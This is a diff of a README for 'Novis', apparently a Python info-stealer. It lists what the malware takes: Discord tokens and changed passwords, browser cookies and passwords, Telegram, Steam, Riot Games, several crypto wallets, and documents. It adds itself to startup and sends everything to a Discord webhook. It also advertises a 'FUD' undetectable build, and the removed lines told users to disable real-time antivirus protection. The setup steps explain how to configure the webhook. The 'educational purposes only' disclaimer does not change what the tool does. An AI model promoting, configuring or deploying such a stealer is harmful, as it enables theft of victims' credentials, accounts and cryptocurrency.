@@ -25,13 +25,14 @@
     +- Uses discords webhook system so it's easy to use.
     +- Self explanatory features.
  
-+ File adds itself to startup
-+ Discord Injection [sends new passwd when changed + new token]
++ File adds to startup
++ Discord Injection [sends new info to webhook]
 + Sends Discord Billing Info
 + Grabs Browser Cookies & Passwd's [Chromium Based Browsers]
 + Grabs Telegram
 + Grabs Steam
-+ Grabs Crypto Wallets [Atomic Wallet, Exodus, Metamask]
++ Grabs Riot Games
++ Grabs Crypto Wallets [Atomic Wallet, Exodus, Metamask, Coinbase, Trust, Phantom]
 + Grabs txt/pdf files inside of C:/Downloads | C:/Documents
 + Premium/Exclusive Novis include FUD exe [Virus Undetected]
     
@@ -44,26 +45,16 @@
 #### Requirements:
 - **Python**:
     - Need Python 3.10.9+ (or up)
-    - You can install python via the install_python file inside of the requirements folder.
+    - You can install python via the `install_python.bat` file inside of the requirements folder.
+    - Open the `install.bat` inside of the requirements folder.
+    - Install the requirements in `requirements.txt`.
     - [Microsoft Store version of Python **WILL NOT WORK**]
 
 #### Preparation:
-- Turn Real Time Protection off in Anti-Virus Settings
-- Have a Discord Server ready to go 
-- Have a webhook inside of the channel you want it to send the hits to 
-- Have Python Installed
+- First paste your webhook in `"WEBHOOK HERE"` inside of Novis.py
+- If you have an error and can't open novis try opening cmd in the directory and doing `"pip install -r requirements.txt"`
+- Use an alt/main to create a new server, and use that server to create the webhook.
 - Use Novis Responsibly
-- Follow ALL THE STEPS BELOW 👇
-
-#### Steps:
-1. Make sure you have Python 3.10.9+ installed
-2. Install the requirements through the 'install.bat' file
-3. Once requirements are installed, edit Novis.py
-4. Put your webhook inside of Novis.py (line 52)
-5. Save Novis.py
-6. Open Novis.exe
-7. Press enter to continue to the main menu
-8. Choose which option you'd like
 
 #### Terms:
 - I do not condone the misuse of my software, I am publishing this software for educational purposes only.
